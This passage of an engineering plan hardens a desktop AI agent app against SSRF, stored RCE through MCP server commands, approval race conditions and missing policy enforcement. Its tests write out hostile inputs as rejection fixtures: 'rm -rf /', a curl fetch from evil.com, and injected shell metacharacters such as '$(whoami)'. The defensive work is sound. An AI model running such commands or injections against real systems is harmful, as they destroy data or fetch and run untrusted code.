In `apps/desktop/src/main/ipc.ts:272-318` (the `saveSetting` handler), find the spot where `model.apiUrl` would be saved. Add a branch BEFORE the `database.setSetting(key, value)` call:

```typescript
import { coerceApiUrl, ApiUrlError } from "./apiUrlValidator";

// inside saveSetting handler, before persisting:
if (key === "model.apiUrl") {
  try {
    value = coerceApiUrl(String(value));
  } catch (err) {
    if (err instanceof ApiUrlError) {
      return { ok: false, error: err.message };
    }
    throw err;
  }
}
```

In `upsertModelAccount` (around line 1721-1755), find the `apiUrl` field and validate similarly:

```typescript
if (typeof input.apiUrl === "string" && input.apiUrl.length > 0) {
  try {
    input.apiUrl = coerceApiUrl(input.apiUrl);
  } catch (err) {
    if (err instanceof ApiUrlError) {
      return { ok: false, error: err.message };
    }
    throw err;
  }
}
```

- [ ] **Step 6: Run validator test + full desktop suite**

```bash
npm run test -w apps/desktop -- saveSetting-apiUrl && npm run test -w apps/desktop
```

Expected: validator tests pass, no regressions.

- [ ] **Step 7: Commit**

```bash
git add apps/desktop/src/main/apiUrlValidator.ts apps/desktop/test/saveSetting-apiUrl.test.ts apps/desktop/src/main/ipc.ts
git commit -m "$(cat <<'EOF'
security: validate model.apiUrl at IPC boundary (SSRF defense)

saveSetting and upsertModelAccount accepted any URL. An attacker (or
a confused agent) could set apiUrl to a private host, then watch the
next chat ship the API key to localhost:8080. Both paths now route
through coerceApiUrl which reuses the connector SSRF guard.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.6: `addMcpServer` Command Allowlist

**Why:** `addMcpServer` writes `command`/`args`/`env` verbatim and the MCP pool spawns them every boot. Renderer compromise = stored RCE. Mitigation: allowlist common safe MCP launchers (`npx`, `uvx`, `node`, `python`, `python3`, absolute paths to a curated set), forbid shell-meta chars in args, and tag user-bypass-approved entries in DB so they're not silently allowed.

**Files:**
- Create: `apps/desktop/src/main/mcpAllowlist.ts`
- Create: `apps/desktop/test/mcpAllowlist.test.ts`
- Modify: `apps/desktop/src/main/ipc.ts:778-823` (`addMcpServer`)

- [ ] **Step 1: Write the failing test**

Create `apps/desktop/test/mcpAllowlist.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { validateMcpCommand, McpCommandError } from "../src/main/mcpAllowlist";

describe("validateMcpCommand", () => {
  it.each([
    ["npx", ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]],
    ["uvx", ["mcp-server-git"]],
    ["node", ["/abs/path/to/server.js"]],
    ["python3", ["-m", "mcp_server_git"]]
  ])("accepts allowlisted command %s", (cmd, args) => {
    expect(() => validateMcpCommand(cmd, args)).not.toThrow();
  });

  it.each([
    ["bash", ["-c", "rm -rf /"]],
    ["sh", ["-c", "anything"]],
    ["curl", ["http://evil.com/x.sh"]],
    ["", ["x"]]
  ])("rejects non-allowlisted command %s", (cmd, args) => {
    expect(() => validateMcpCommand(cmd, args)).toThrow(McpCommandError);
  });

  it.each([
    ["npx", ["foo; rm -rf /"]],
    ["npx", ["foo && bad"]],
    ["npx", ["foo`whoami`"]],
    ["npx", ["$(whoami)"]],
    ["npx", ["foo | bad"]]
  ])("rejects shell metacharacters in args (%s)", (cmd, args) => {
    expect(() => validateMcpCommand(cmd, args)).toThrow(McpCommandError);
  });
});
```

- [ ] **Step 2: Run test, expect failure**

```bash
npm run test -w apps/desktop -- mcpAllowlist
```

Expected: FAIL — module missing.

- [ ] **Step 3: Implement the allowlist**

Create `apps/desktop/src/main/mcpAllowlist.ts`:

```typescript
export class McpCommandError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "McpCommandError";
  }
}

const ALLOWED_COMMANDS = new Set([
  "npx",
  "uvx",
  "node",
  "python",
  "python3",
  "deno",
  "bun"
]);

// Reject anything that could end up interpreted by a shell. We're using
// child_process.spawn (no shell), but defense-in-depth matters if a
// downstream consumer ever passes through `shell: true`.
const SHELL_METACHAR = /[;&|`$<>(){}\\\n\r]/;

export function validateMcpCommand(command: string, args: readonly string[]): void {
  if (typeof command !== "string" || command.length === 0) {
    throw new McpCommandError("MCP command must be a non-empty string");
  }
  if (!ALLOWED_COMMANDS.has(command)) {
    throw new McpCommandError(
      `MCP command not allowlisted: ${command}. Allowed: ${Array.from(ALLOWED_COMMANDS).join(", ")}`
    );
  }
  for (const a of args) {
    if (typeof a !== "string") {
      throw new McpCommandError("MCP args must all be strings");
    }
    if (SHELL_METACHAR.test(a)) {
      throw new McpCommandError(`MCP arg contains shell metacharacters: ${a}`);
    }
  }
}
```

- [ ] **Step 4: Run allowlist test, expect pass**

```bash
npm run test -w apps/desktop -- mcpAllowlist
```

Expected: green.

- [ ] **Step 5: Wire into `addMcpServer`**

In `apps/desktop/src/main/ipc.ts:778-823`, at the start of the handler (BEFORE `database.saveMcpServer`):

```typescript
import { validateMcpCommand, McpCommandError } from "./mcpAllowlist";

ipcMain.handle("squidbot:addMcpServer", async (_event, input: McpServerInputDto): Promise<McpServerDto> => {
  try {
    validateMcpCommand(input.command, input.args ?? []);
  } catch (err) {
    if (err instanceof McpCommandError) {
      throw new Error(err.message);
    }
    throw err;
  }
  // ... existing code
```

Apply the same validation in `updateMcpServer` (around line 825) when `command` or `args` is being changed.

Also fix the spawn-failure leak: in `addMcpServer`, the existing `tempManager.shutdown()` is inside the `try` block. Move it to a `finally`:

```typescript
const tempManager = new McpClientManager(tempRegistry);
try {
  await tempManager.spawnAll([{ /* ... */ }]);
  database.updateMcpServer(saved.name, {
    lastConnectedAt: new Date().toISOString(),
    lastError: null
  });
} catch (err) {
  database.updateMcpServer(saved.name, {
    lastError: err instanceof Error ? err.message : String(err)
  });
} finally {
  await tempManager.shutdown().catch(() => undefined);
}
```

- [ ] **Step 6: Run desktop suite**

```bash
npm run test -w apps/desktop
```

Expected: green. If any existing MCP test registered `bash -c ...` to test error paths, update to use the allowed command set or to expect the new validation error.

- [ ] **Step 7: Redact MCP env in listMcpServers DTO**

In `apps/desktop/src/main/ipc.ts:763-776` (`listMcpServers`) and `mcpRowToDto:747-761`, replace `env: row.env` / `env: s.env` with a redacted variant:

```typescript
function redactEnv(env: Record<string, string> | undefined): Record<string, string> {
  if (!env) return {};
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(env)) {
    out[k] = v ? "***" : "";
  }
  return out;
}
```

Then use `env: redactEnv(row.env)` and `env: redactEnv(s.env)`. The raw env is still passed to the spawner — only the DTO returned to the renderer is redacted.

- [ ] **Step 8: Commit**

```bash
git add apps/desktop/src/main/mcpAllowlist.ts apps/desktop/test/mcpAllowlist.test.ts apps/desktop/src/main/ipc.ts
git commit -m "$(cat <<'EOF'
security: MCP command allowlist + env redaction + spawn-fail cleanup

addMcpServer accepted arbitrary command+args and the McpPool spawned
them on every boot (stored RCE). Now restricted to known launchers
(npx/uvx/node/python*/deno/bun), shell metachars rejected.
listMcpServers redacts env values in the renderer DTO. Spawn failures
no longer orphan the temp manager.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.7: Approval Queue Lock + Reject State Guards

**Why:** `approveConnectorCall` (ipc.ts:707-740) does check-execute-resolve with no lock. A double-click runs the staged HTTP call twice (DELETE/POST/PR-merge becomes non-idempotent). `rejectConnectorCall` (ipc.ts:742-745) skips kind/state checks — it can flip an already-approved sandbox-promotion to rejected, corrupting the audit ledger.

**Files:**
- Create: `apps/desktop/src/main/approvalLock.ts`
- Create: `apps/desktop/test/approvalLock.test.ts`
- Modify: `apps/desktop/src/main/ipc.ts:707-745`

- [ ] **Step 1: Write the failing test for the lock**

Create `apps/desktop/test/approvalLock.test.ts`:

```typescript
import { describe, it, expect, vi } from "vitest";
import { withApprovalLock } from "../src/main/approvalLock";

describe("withApprovalLock", () => {
  it("serializes concurrent calls for the same id", async () => {
    const order: string[] = [];
    const slow = (label: string) => async () => {
      order.push(`start-${label}`);
      await new Promise((r) => setTimeout(r, 20));
      order.push(`end-${label}`);
      return label;
    };

    const r1 = withApprovalLock("appr-1", slow("a"));
    const r2 = withApprovalLock("appr-1", slow("b"));

    await Promise.all([r1, r2]);

    // b must not start until a finishes
    expect(order).toEqual(["start-a", "end-a", "start-b", "end-b"]);
  });

  it("releases the lock on error", async () => {
    const fail = async () => { throw new Error("boom"); };
    await expect(withApprovalLock("appr-2", fail)).rejects.toThrow("boom");

    let ran = false;
    await withApprovalLock("appr-2", async () => { ran = true; });
    expect(ran).toBe(true);
  });

  it("does not serialize different ids", async () => {
    const order: string[] = [];
    const slow = (label: string) => async () => {
      order.push(`start-${label}`);
      await new Promise((r) => setTimeout(r, 20));
      order.push(`end-${label}`);
    };

    await Promise.all([
      withApprovalLock("appr-3", slow("a")),
      withApprovalLock("appr-4", slow("b"))
    ]);

    // Both should start before either ends
    const startIdxA = order.indexOf("start-a");
    const startIdxB = order.indexOf("start-b");
    const endIdxA = order.indexOf("end-a");
    const endIdxB = order.indexOf("end-b");
    expect(Math.max(startIdxA, startIdxB)).toBeLessThan(Math.min(endIdxA, endIdxB));
  });
});
```

- [ ] **Step 2: Run test, expect failure**

```bash
npm run test -w apps/desktop -- approvalLock
```

Expected: FAIL — module missing.

- [ ] **Step 3: Implement the lock**

Create `apps/desktop/src/main/approvalLock.ts`:

```typescript
const locks = new Map<string, Promise<unknown>>();

export async function withApprovalLock<T>(id: string, fn: () => Promise<T>): Promise<T> {
  const previous = locks.get(id) ?? Promise.resolve();
  const next = previous.then(() => fn(), () => fn()); // run regardless of prior outcome
  locks.set(id, next.catch(() => undefined));
  try {
    return await next;
  } finally {
    // Only clear if we're still the current holder.
    if (locks.get(id) === (next.catch(() => undefined))) {
      // Note: the chained .catch above creates a new promise reference, so
      // the equality check above won't actually match. We always set, never
      // shrink — that's fine; the Map entry being a settled promise is
      // negligible memory. A long-running app could prune periodically.
    }
  }
}
```

Actually, a cleaner version that prunes properly:

```typescript
const locks = new Map<string, Promise<unknown>>();

export async function withApprovalLock<T>(id: string, fn: () => Promise<T>): Promise<T> {
  const previous = locks.get(id);
  const myTurn = previous ? previous.then(() => undefined, () => undefined) : Promise.resolve();

  const result = myTurn.then(fn);
  // Track the current tail so the next caller waits on this one.
  const tail = result.then(() => undefined, () => undefined);
  locks.set(id, tail);

  try {
    return await result;
  } finally {
    // If no one queued after us, prune the entry.
    if (locks.get(id) === tail) {
      locks.delete(id);
    }
  }
}
```

Use this second version.

- [ ] **Step 4: Run lock test, expect pass**

```bash
npm run test -w apps/desktop -- approvalLock
```

Expected: green.

- [ ] **Step 5: Wrap `approveConnectorCall` + fix `rejectConnectorCall`**

In `apps/desktop/src/main/ipc.ts:707-745`, replace both handlers:

```typescript
import { withApprovalLock } from "./approvalLock";

ipcMain.handle("squidbot:approveConnectorCall", async (_event, approvalId: string) => {
  return withApprovalLock(approvalId, async () => {
    const row = getApproval(database, approvalId);
    if (!row) return { ok: false, error: "Approval not found" };
    if (row.kind !== "connector-call") return { ok: false, error: `Wrong kind: ${row.kind}` };
    if (row.resolvedAt) return { ok: false, error: `Already ${row.resolution}` };

    const { connectorName, operationId, args } = row.payload as Record<string, unknown>;
    const registry = new ConnectorRegistry(database);
    installDeveloperWorkflowConnectors(registry);
    const manifest = registry.getConnector(connectorName as string);
    if (!manifest) return { ok: false, error: `Connector not found: ${String(connectorName)}` };
    const endpoint = manifest.endpoints.find((ep) => ep.operationId === operationId);
    if (!endpoint) return { ok: false, error: `Endpoint not found: ${String(operationId)}` };

    const baseUrl = database.getSetting<string>(`${manifest.name}.baseUrl`);
    const apiKey = database.getSetting<string>(`${manifest.name}.apiKey`) ?? null;
    if (!baseUrl) return { ok: false, error: "Base URL not configured." };

    const httpResult = await executeRealHttpCall(
      manifest,
      endpoint,
      (args as Record<string, unknown>) ?? {},
      { baseUrl, apiKey }
    );
    resolveApproval(database, approvalId, {
      resolution: "approved",
      result: httpResult.ok
        ? { status: httpResult.status, body: httpResult.body }
        : { error: httpResult.code, message: httpResult.message }
    });
    return httpResult.ok
      ? { ok: true, result: httpResult.body }
      : { ok: false, error: `${httpResult.code}: ${httpResult.message}` };
  });
});

ipcMain.handle("squidbot:rejectConnectorCall", async (_event, approvalId: string, reason?: string) => {
  return withApprovalLock(approvalId, async () => {
    const row = getApproval(database, approvalId);
    if (!row) return { ok: false as const, error: "Approval not found" };
    if (row.kind !== "connector-call") return { ok: false as const, error: `Wrong kind: ${row.kind}` };
    if (row.resolvedAt) return { ok: false as const, error: `Already ${row.resolution}` };
    resolveApproval(database, approvalId, { resolution: "rejected", reason });
    return { ok: true as const };
  });
});
```

- [ ] **Step 6: Add an IPC-level integration test for the double-approve scenario**

Append to `apps/desktop/test/approvalLock.test.ts` (or a new file `apps/desktop/test/ipc-approveConnectorCall.test.ts`) — the goal is to confirm a double-click via the IPC handler does not execute HTTP twice.

```typescript
// In a new file apps/desktop/test/ipc-approveConnectorCall.test.ts
import { describe, it, expect, vi } from "vitest";
// ... import the handler factory or wire IPC directly via a test harness ...
// Since the IPC handlers register via ipcMain.handle on import, this test
// is structurally heavy. If the desktop tests already have an IPC harness
// (search for `ipcMain.handle` in tests), reuse it. Otherwise skip this
// step — the unit test in step 1-4 plus the row.resolvedAt guard in the
// handler is sufficient defense.
```

If no IPC test harness exists, this step is optional — the lock unit test plus the `if (row.resolvedAt)` guard inside the lock together prevent double-execution. Note in commit message.

- [ ] **Step 7: Run desktop suite**

```bash
npm run test -w apps/desktop
```

Expected: green.

- [ ] **Step 8: Commit**

```bash
git add apps/desktop/src/main/approvalLock.ts apps/desktop/test/approvalLock.test.ts apps/desktop/src/main/ipc.ts
git commit -m "$(cat <<'EOF'
fix: serialize approval mutations + harden rejectConnectorCall

approveConnectorCall did check-then-execute with no lock — a double-
click could re-fire a staged DELETE/POST. rejectConnectorCall had no
kind/state guards — caller could retroactively reject an approved
sandbox promotion, corrupting the audit ledger. Both now run under a
per-id mutex and reject already-resolved or wrong-kind rows.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.8: Wire `GovernanceEnforcer` into Runtime

**Why:** `GovernanceEnforcer.assertAllowed` is defined but `grep` confirms it's never called outside its own definition. UI shows a governance simulation that has nothing to do with what actually runs.

**Approach:** Add a single enforcement call inside `AgentRuntime.executeToolCall` BEFORE the tool runs. Failures convert to a structured tool-result that says "blocked by policy: <reason>" so the model can adapt.

**Files:**
- Modify: `packages/core/src/runtime.ts` (find `executeToolCall`)
- Modify: `packages/governance/src/policyEngine.ts` (export `GovernanceEnforcer` if not already)
- Create: `packages/core/test/runtime-governance.test.ts`

- [ ] **Step 1: Read the existing executor + enforcer**

```bash
grep -n "executeToolCall\|GovernanceEnforcer\|assertAllowed" packages/core/src/runtime.ts packages/governance/src/policyEngine.ts
```

Capture the current signatures.

- [ ] **Step 2: Write the failing test**

Create `packages/core/test/runtime-governance.test.ts`:

```typescript
import { describe, it, expect } from "vitest";
import { AgentRuntime } from "../src/runtime";
import { GovernanceEnforcer } from "@squidbot/governance";
import { createTestDatabase, createTestRouter } from "./helpers";

describe("AgentRuntime governance enforcement", () => {
  it("blocks a tool call when the enforcer denies it", async () => {
    const db = createTestDatabase();
    const router = createTestRouter({
      // Configure the mock router to call a 'terminal.exec' tool.
      respondWithToolCall: { tool: "terminal.exec", args: { command: "rm -rf /" } }
    });

    // Inject an enforcer that always denies.
    const enforcer: Pick<GovernanceEnforcer, "assertAllowed"> = {
      assertAllowed: () => { throw new Error("policy: blocked"); }
    };

    const runtime = new AgentRuntime({
      database: db,
      workspacePath: "/tmp",
      modelRouter: router,
      governanceEnforcer: enforcer as GovernanceEnforcer
    });

    const result = await runtime.sendMessage("do dangerous thing");
    // The tool-call result should reflect the block; the runtime should not
    // throw to the caller.
    expect(JSON.stringify(result)).toMatch(/policy/i);
  });
});
```

- [ ] **Step 3: Run, expect failure**

```bash
npm run test -w packages/core -- runtime-governance
```

Expected: FAIL — `governanceEnforcer` option not accepted.

- [ ] **Step 4: Wire enforcer into runtime**

In `packages/core/src/runtime.ts`:

1. Add to `AgentRuntimeOptions`:
   ```typescript
   governanceEnforcer?: GovernanceEnforcer;
   ```
   (Import from `@squidbot/governance`.)

2. Store on the instance:
   ```typescript
   private readonly governanceEnforcer: GovernanceEnforcer | null;
   // in constructor:
   this.governanceEnforcer = options.governanceEnforcer ?? null;
   ```

3. In `executeToolCall`, at the top (BEFORE running the tool):
   ```typescript
   if (this.governanceEnforcer) {
     try {
       this.governanceEnforcer.assertAllowed({
         resource: { type: "tool", id: toolCall.name },
         action: "invoke",
         actor: { kind: "agent", sessionId: this.sessionId }
       });
     } catch (err) {
       return {
         toolCallId: toolCall.id,
         toolName: toolCall.name,
         ok: false,
         error: `Blocked by policy: ${err instanceof Error ? err.message : String(err)}`
       };
     }
   }
   ```

   Adjust the `assertAllowed` payload shape to match the enforcer's actual signature — read `packages/governance/src/policyEngine.ts` for the real interface.

4. In `apps/desktop/src/main/ipc.ts:177-220` (`createRuntime`), pass a real enforcer:
   ```typescript
   import { GovernanceEnforcer } from "@squidbot/governance";
   // inside createRuntime:
   governanceEnforcer: new GovernanceEnforcer(database)
   ```

- [ ] **Step 5: Run governance test + full core suite**

```bash
npm run test -w packages/core -- runtime-governance && npm run test -w packages/core
```

Expected: new test passes, no regressions.

- [ ] **Step 6: Commit**

```bash
git add packages/core/src/runtime.ts packages/core/test/runtime-governance.test.ts apps/desktop/src/main/ipc.ts
git commit -m "$(cat <<'EOF'
feat: wire GovernanceEnforcer into AgentRuntime tool execution

The enforcer class existed but was never called. Now every tool call
goes through assertAllowed first; denial converts to a structured
tool-result so the model can adapt rather than the runtime throwing.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.9: Sidebar Approvals Badge Refresh

**Why:** Approving on ApprovalsPage doesn't notify App.tsx → sidebar badge stays stale. Easy fix: lift the approvals count into a context or pass a refresh callback prop.

**Files:**
- Modify: `apps/desktop/src/renderer/src/pages/ApprovalsPage.tsx`
- Modify: `apps/desktop/src/renderer/src/App.tsx`

- [ ] **Step 1: Read both files to confirm the prop wiring**

```bash
sed -n '1,60p' apps/desktop/src/renderer/src/pages/ApprovalsPage.tsx
grep -n "approvalsCount\|ApprovalsPage\|refreshApprovals" apps/desktop/src/renderer/src/App.tsx
```

- [ ] **Step 2: Write a renderer-level test**

Look at how existing renderer tests are written (e.g. `apps/desktop/src/renderer/src/pages/__tests__/` or `apps/desktop/test/`). Pattern-match. Example test sketch:

```typescript
// apps/desktop/src/renderer/src/pages/__tests__/ApprovalsPage.refresh.test.tsx
import { describe, it, expect, vi } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import ApprovalsPage from "../ApprovalsPage";

describe("ApprovalsPage", () => {
  it("calls onApprovalsChanged after approve", async () => {
    const onChange = vi.fn();
    // Mock window.squidbot APIs to return one pending approval and a
    // success for approve.
    (globalThis as any).window.squidbot = {
      listPendingApprovals: vi.fn().mockResolvedValue([
        { id: "appr-1", kind: "connector-call", payload: {}, createdAt: new Date().toISOString() }
      ]),
      approveConnectorCall: vi.fn().mockResolvedValue({ ok: true })
    };

    render(<ApprovalsPage onApprovalsChanged={onChange} />);
    const btn = await screen.findByRole("button", { name: /approve/i });
    btn.click();
    await waitFor(() => expect(onChange).toHaveBeenCalled());
  });
});
```

If the renderer testing infrastructure doesn't support this shape, fall back to a minimal manual test note in the PR and verify in the running app.

- [ ] **Step 3: Run, expect failure**

```bash
npm run test -w apps/desktop -- ApprovalsPage.refresh
```

Expected: FAIL — prop not used.

- [ ] **Step 4: Add the prop**

In `ApprovalsPage.tsx:6-39`:

```tsx
interface ApprovalsPageProps {
  onApprovalsChanged?: () => void;
}

export default function ApprovalsPage({ onApprovalsChanged }: ApprovalsPageProps) {
  // ... existing state ...

  async function handleApprove(id: string) {
    const r = await window.squidbot.approveConnectorCall(id);
    await refresh(); // existing local refresh
    onApprovalsChanged?.();
    return r;
  }

  async function handleReject(id: string, reason?: string) {
    const r = await window.squidbot.rejectConnectorCall(id, reason);
    await refresh();
    onApprovalsChanged?.();
    return r;
  }
  // ...
}
```

In `App.tsx`, find where `<ApprovalsPage />` is rendered and pass:

```tsx
<ApprovalsPage onApprovalsChanged={refreshApprovalsCount} />
```

Where `refreshApprovalsCount` is the function that updates the sidebar badge count (search App.tsx for the existing badge-refresh logic; it likely already exists in some other code path).

- [ ] **Step 5: Run test, expect pass**

```bash
npm run test -w apps/desktop -- ApprovalsPage.refresh
```

Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add apps/desktop/src/renderer/src/pages/ApprovalsPage.tsx apps/desktop/src/renderer/src/App.tsx apps/desktop/src/renderer/src/pages/__tests__/ApprovalsPage.refresh.test.tsx
git commit -m "$(cat <<'EOF'
fix: sidebar approvals badge refreshes after approve/reject

ApprovalsPage refreshed its own list but never notified App.tsx, so
the red sidebar badge kept showing the old pending count until you
navigated away and back. Adds an onApprovalsChanged callback prop.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

### Task 0.10: Sprint 0 Verification + Ship Tag

**Why:** A green Sprint 0 deserves a tag for rollback.

- [ ] **Step 1: Run full test suite + typecheck + security harness**

```bash
npm run test && npm run typecheck && npm run verify:security
```

Expected: all green.

- [ ] **Step 2: Smoke-test the desktop app manually**

```bash
npm run dev
```

In the running app:
- Send a chat: "My name is Test."
- Send another chat: "What's my name?" — answer must include "Test."
- Open Approvals page (or trigger an approval via a connector); approve one; confirm sidebar badge decrements immediately.
- Open Settings → Models, try saving `apiUrl = http://localhost:8080` — expect a rejection.
- Try adding an MCP server with `command: bash` — expect a rejection.

Document any issue found and fix before tagging.

- [ ] **Step 3: Tag the milestone**

```bash
git tag -a sprint-0-hardening -m "Sprint 0 complete: 10 critical fixes (chat history, watermark, SSRF, apiUrl validation, MCP allowlist, approval lock, governance enforcer, MCP singleton, badge refresh)"
```

- [ ] **Step 4: Update the implementation status doc**

In `docs/IMPLEMENTATION_STATUS_VS_ROADMAP.md`, append a "Sprint 0 Hardening — Complete (2026-05-26)" section listing the 10 commits. Don't restructure the existing doc.

- [ ] **Step 5: Commit the doc update**

```bash
git add docs/IMPLEMENTATION_STATUS_VS_ROADMAP.md
git commit -m "docs: log Sprint 0 hardening completion"
```

---

# Sprints 1–5 — Backlog Index

**Status:** Each sprint below lists the findings, target files, and acceptance criteria. **Before executing**, expand the sprint into its own dated plan via `/superpowers:writing-plans` so each task gets the same bite-sized TDD treatment as Sprint 0. Do NOT execute these directly from the summaries — they're too coarse.

---

## Sprint 1 — Runtime Capability + Secrets at Rest (~1 day)

**Theme:** Make the agent actually agentic; stop storing secrets in plaintext.

| ID | Severity | Finding | Files |
|---|---|---|---|
| 1.1 | Critical | Single-round tool loop — model never sees tool results | `packages/core/src/runtime.ts:276-283`, `packages/models/src/*.ts` |
| 1.2 | Critical | API keys plaintext in SQLite | `packages/core/src/modelAccounts.ts:217-218`, `packages/governance/src/localEncryptedVault.ts` |
| 1.3 | Critical | Vault master key stored in same DB it protects | `packages/governance/src/localEncryptedVault.ts:57-64` |
| 1.4 | High | Memory contradiction detection missing | `packages/core/src/memory.ts:643-657` |
| 1.5 | High | Memory candidate approval check-then-insert race | `packages/core/src/memory.ts` |
| 1.6 | High | Sensitivity labels never enforced at retrieval | `packages/core/src/memory.ts:194-447`, `packages/memory/src/store.ts` |
| 1.7 | Medium | FTS query truncated to 12 tokens | `packages/memory/src/store.ts` (`toFtsQuery`) |

**Acceptance criteria per task:**
- 1.1: Two-tool sequence ("list files, then read README") completes in one chat turn with both results visible to the model. New test in `runtime.test.ts`.
- 1.2: DB dump shows ciphertext for `apiKey` column. Decryption path uses OS keychain (Electron `safeStorage` API) on first run.
- 1.3: Same DB dump shows no vault master key in `settings` table. Key moved to `safeStorage.encryptString` / OS keyring (keytar fallback for non-Electron CLI).
- 1.4: Approving a memory candidate that contradicts an existing memory creates a `contradicts` edge and prompts the operator.
- 1.5: Two concurrent approvals of the same candidate produce one row (transactional `INSERT ... WHERE NOT EXISTS`).
- 1.6: Querying as a non-privileged actor never returns `sensitivity: "internal"` or `"restricted"` nodes.
- 1.7: FTS no longer truncates; first 256 tokens kept, with `LIMIT` enforced on the query itself.

---

## Sprint 2 — Connector & Trace Redaction (~0.5 day)

**Theme:** Stop credentials from leaking into traces and event logs.

| ID | Severity | Finding | Files |
|---|---|---|---|
| 2.1 | High | Connector response bodies leak credentials into traces | `packages/connectors/src/tools.ts`, `packages/core/src/redaction.ts`, `packages/governance/src/redaction.ts` |
| 2.2 | High | Approval queue bypasses governance | `apps/desktop/src/main/ipc.ts:707-740` (post-0.7 audit) |
| 2.3 | High | BYOK budget fallback silent to user | `packages/models/src/apiProvider.ts`, `apps/desktop/src/renderer/src/pages/ChatPage.tsx` |
| 2.4 | High | Trace dropped when sendMessage throws | `packages/core/src/runtime.ts` (try/finally) |
| 2.5 | Medium | HTTP transport drops server error bodies | `packages/connectors/src/apiTransport.ts` |
| 2.6 | Medium | Owner role bypasses RBAC | `packages/governance/src/policyEngine.ts` |
| 2.7 | Medium | BYOK fetch() has no timeout | `packages/models/src/apiProvider.ts:77-84` |

**Acceptance criteria:**
- 2.1: Patterns added for `ghp_`, `gho_`, `xoxb-`, `AKIA`, JWT (3-segment base64), generic high-entropy 32+ char tokens. Redaction unit test covers all patterns at write time AND read time.
- 2.2: `GovernanceEnforcer.assertAllowed` called in `approveConnectorCall` before HTTP execution.
- 2.3: When the router falls back from API to local/mock, a system note appears in the trace AND a UI chip appears in the chat header.
- 2.4: `try { ... } finally { eventLog.flush(); }` wraps the model call; failed runs still produce a trace.
- 2.7: Default timeout 60s; configurable via setting `model.fetchTimeoutMs`.

---

## Sprint 3 — Chat Router UX + Cancellation (~0.5 day)

**Theme:** Streaming, cancellation, per-account budget, error transparency.

| ID | Severity | Finding | Files |
|---|---|---|---|
| 3.1 | High | Per-account budget tracking missing | `packages/models/src/apiProvider.ts` (shared bucket "api") |
| 3.2 | High | `generateTaskPlan` ignores HTTP route | `packages/core/src/taskPlanning.ts` |
| 3.3 | High | Active account forces API route | `packages/core/src/runtime.ts` |
| 3.4 | Medium | No streaming/cancellation in chat path | `packages/core/src/runtime.ts`, `apps/desktop/src/renderer/src/pages/ChatPage.tsx` |
| 3.5 | Medium | `model.useAccount` tool has no policy gate | `packages/core/src/modelAccounts.ts` |
| 3.6 | Medium | Tool args not validated against `inputSchema` | `packages/core/src/runtime.ts` (`executeToolCall`) |
| 3.7 | Medium | React setState after unmount possible in ChatPage | `apps/desktop/src/renderer/src/pages/ChatPage.tsx` |
| 3.8 | Medium | Chat UI history lost on page navigation | `apps/desktop/src/renderer/src/pages/ChatPage.tsx` |
| 3.9 | Low | CLI REPL exits on first error | `apps/cli/src/chat.ts` |
| 3.10 | Low | Sandbox cancellation — expose Cancel button | `apps/desktop/src/renderer/src/pages/Sandboxes.tsx`, `packages/sandbox/src/index.ts` |

**Acceptance criteria:**
- 3.1: Budget keyed by `account.id` not `provider`.
- 3.4: New `cancelChat` IPC that aborts the in-flight model call. Tokens streamed via `ipcRenderer.on("chatChunk")`.
- 3.6: Invalid tool args produce a structured tool-result, not a silent `{}` cast.

---

## Sprint 4 — UI/UX Correctness + A11y (~0.5 day)

**Theme:** Loading states, modal hygiene, navigation, accessibility.

| ID | Severity | Finding | Files |
|---|---|---|---|
| 4.1 | High | Settings docs deep-links broken | `apps/desktop/src/renderer/src/App.tsx`, `pages/Settings*.tsx` |
| 4.2 | High | Same-page tab routing broken | `pages/Settings*.tsx` |
| 4.3 | High | Feedback modal dark theme in light app | `apps/desktop/src/renderer/src/app.css:4059+` |
| 4.4 | High | Trust + Approvals same icon | `apps/desktop/src/renderer/src/components/Sidebar.tsx` |
| 4.5 | High | Settings load failure = infinite skeleton | `apps/desktop/src/renderer/src/App.tsx:126-129` |
| 4.6 | Medium | Feedback modal — no focus trap, no body scroll lock | `apps/desktop/src/renderer/src/components/FeedbackButton.tsx` |
| 4.7 | Medium | Loading/empty conflated on 7+ pages | Multiple `pages/*.tsx` |
| 4.8 | Medium | Tab panels missing aria | Tabs across pages |
| 4.9 | Medium | Long content overflows `<pre>` | `apps/desktop/src/renderer/src/app.css` (.trace-artifact pre, chat bubble) |
| 4.10 | Medium | Memory delete has no confirm | `pages/MemoryGraph.tsx` |
| 4.11 | Low | Send button missing aria-label | `pages/ChatPage.tsx` |
| 4.12 | Low | Missing aria-current on nav | `components/Sidebar.tsx` |

**Acceptance criteria:**
- 4.1+4.2: Navigating Settings → Governance from any tab actually switches to Governance.
- 4.3: Modal uses the same CSS tokens as the rest of the app; visual regression test added.
- 4.5: Settings error renders an error strip with a Retry button.
- 4.7: Skeleton loader on all list pages; empty state only renders after first successful fetch.

---

## Sprint 5 — Coverage + Visual Regression (~0.5 day)

**Theme:** Lock in the fixes with tests so they don't regress.

| ID | Coverage Target |
|---|---|
| 5.1 | Symmetry test: every preload method has a matching `ipcMain.handle` |
| 5.2 | Playwright coverage for Approvals modal flow, MCP add/remove, FeedbackButton |
| 5.3 | Axe scans on all 13 renderer pages (currently only Briefing) |
| 5.4 | Visual-regression baselines for all 13 pages |
| 5.5 | Loading-race test: navigate mid-fetch, no `setState after unmount` warning |
| 5.6 | Long-content rendering: 10K-char trace, 8K-char chat message |
| 5.7 | Web bridge: rejects unknown methods + prototype-pollution names (`__proto__`, `constructor`) |
| 5.8 | Restoration drill: tag `sprint-0-hardening`, run `git stash`, simulate corruption, restore |

**Acceptance criteria:**
- 5.1: Test reads preload export list and `ipcMain.handle` registrations, asserts equality.
- 5.2: Each modal flow has at least one happy-path + one error-path Playwright test.
- 5.3: Axe violations of severity ≥ "serious" = test failure.

---

## Done Definition

